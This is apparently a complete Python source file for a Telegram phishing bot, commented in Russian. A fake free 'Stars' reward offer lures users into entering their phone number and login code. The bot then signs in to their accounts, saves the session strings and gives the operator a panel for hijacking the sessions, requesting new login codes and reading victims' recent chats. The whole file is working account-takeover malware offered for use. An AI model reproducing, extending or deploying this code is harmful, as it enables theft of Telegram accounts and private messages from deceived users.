import os
import asyncio
from telebot import TeleBot, types
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import FloodWaitError

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

bot = TeleBot(BOT_TOKEN)
victims = {}  # phone → {session_string, fished_code, first_name, username}

print("[+] PHANTOM STARS BOT ЗАПУЩЕН НА RAILWAY")

# ====================== МАСКИРОВКА ======================
@bot.message_handler(commands=['start'])
def start(message):
    text = """🌟 <b>Telegram Stars Rewards Center 2026</b>

🎁 Получайте Stars бесплатно за подключение аккаунта!

✅ Официальное API Telegram
✅ 2500–5000 Stars сразу
✅ Ежедневные бонусы и множители
✅ Обмен на TON, USDT, NFT

Нажми кнопку ниже и получи Stars уже сейчас 👇"""

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🚀 Подключить аккаунт и получить Stars", callback_data="connect"))
    bot.send_message(message.chat.id, text, parse_mode='HTML', reply_markup=markup)

# ====================== ФИШИНГ ======================
@bot.callback_query_handler(func=lambda call: call.data == "connect")
def connect(call):
    bot.send_message(call.message.chat.id, "📱 Введи номер телефона (+79xxxxxxxxx):")
    bot.register_next_step_handler(call.message, wait_phone)

def wait_phone(message):
    phone = message.text.strip()
    if not phone.startswith("+"):
        phone = "+" + phone
    bot.send_message(message.chat.id, f"✅ Номер: <b>{phone}</b>\n\nВведи код из Telegram/SMS:", parse_mode='HTML')
    bot.register_next_step_handler(message, wait_code, phone)

async def wait_code(message, phone):
    code = message.text.strip()
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        await client.sign_in(phone, code)
        session_string = client.session.save()
        me = await client.get_me()

        victims[phone] = {
            "session_string": session_string,
            "fished_code": code,
            "first_name": me.first_name,
            "username": me.username
        }
        await bot.send_message(ADMIN_ID, f"🌟 НОВАЯ ЖЕРТВА!\n📱 {phone}\n👤 {me.first_name}")
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"⚠️ Фиш: {phone} | Код: {code} | Ошибка: {e}")
    finally:
        await client.disconnect()

    bot.send_message(message.chat.id, "🎉 Аккаунт подключён! Начислено 4250 Stars!", parse_mode='HTML')

# ====================== АДМИН ПАНЕЛЬ ======================
@bot.message_handler(commands=['adminwork'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "Доступ запрещён.")
        return
    asyncio.create_task(show_admin_panel(message.chat.id))

async def show_admin_panel(chat_id):
    if not victims:
        await bot.send_message(chat_id, "Пока нет пойманных аккаунтов.")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    for phone in victims:
        short = phone[-8:]
        markup.add(
            types.InlineKeyboardButton(f"🔑 Свежий код {short}", callback_data=f"getcode:{phone}"),
            types.InlineKeyboardButton(f"📄 StringSession {short}", callback_data=f"file:{phone}"),
            types.InlineKeyboardButton(f"👁 Проверить {short}", callback_data=f"check:{phone}"),
            types.InlineKeyboardButton(f"📨 Последние сообщения {short}", callback_data=f"lastmsg:{phone}")
        )

    text = f"🔥 PHANTOM ADMIN PANEL\n📱 Активных аккаунтов: {len(victims)}"
    await bot.send_message(chat_id, text, reply_markup=markup)

# ====================== КНОПКИ ======================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.from_user.id != ADMIN_ID:
        return
    action, phone = call.data.split(":", 1)
    data = victims.get(phone)
    if not data:
        bot.answer_callback_query(call.id, "Аккаунт не найден")
        return

    if action == "file":
        bot.send_message(call.message.chat.id, f"📄 StringSession для {phone}:\n\n<code>{data['session_string']}</code>\n\nСкопируй и используй в login.py", parse_mode='HTML')
    elif action == "getcode":
        asyncio.create_task(send_fresh_code(phone, call.message.chat.id))
    elif action == "check":
        asyncio.create_task(check_account(phone, call.message.chat.id))
    elif action == "lastmsg":
        asyncio.create_task(get_last_messages(phone, call.message.chat.id))

    bot.answer_callback_query(call.id, "Выполнено!")

# ====================== ПРИКОЛЬНЫЕ ФУНКЦИИ ======================
async def send_fresh_code(phone, chat_id):
    """Получить свежий код для входа в аккаунт жертвы"""
    data = victims[phone]
    client = TelegramClient(StringSession(data["session_string"]), API_ID, API_HASH)
    try:
        await client.connect()
        await client.send_code_request(phone)
        await bot.send_message(chat_id, f"✅ Свежий код запрошен для {phone}\nОн придёт в Telegram этого аккаунта. Просто введи его в свой login.py")
    except Exception as e:
        await bot.send_message(chat_id, f"❌ Ошибка: {e}")
    finally:
        await client.disconnect()

async def check_account(phone, chat_id):
    data = victims[phone]
    client = TelegramClient(StringSession(data["session_string"]), API_ID, API_HASH)
    try:
        await client.connect()
        me = await client.get_me()
        await bot.send_message(chat_id, f"👁 Аккаунт {phone}\nИмя: {me.first_name}\nUsername: @{me.username or 'нет'}\nID: {me.id}\n✅ Сессия жива!")
    except Exception as e:
        await bot.send_message(chat_id, f"❌ Ошибка: {e}")
    finally:
        await client.disconnect()

async def get_last_messages(phone, chat_id):
    data = victims[phone]
    client = TelegramClient(StringSession(data["session_string"]), API_ID, API_HASH)
    try:
        await client.connect()
        dialogs = await client.get_dialogs(limit=5)
        text = f"📨 Последние 5 диалогов {phone}:\n\n"
        for d in dialogs:
            text += f"• {d.name}: {d.message.message[:60]}...\n"
        await bot.send_message(chat_id, text)
    except Exception as e:
        await bot.send_message(chat_id, f"❌ Ошибка: {e}")
    finally:
        await client.disconnect()

# ====================== ЗАПУСК ======================
if __name__ == "__main__":
    print("[+] infinity_polling запущен")
    bot.infinity_polling(none_stop=True, interval=0, timeout=30)
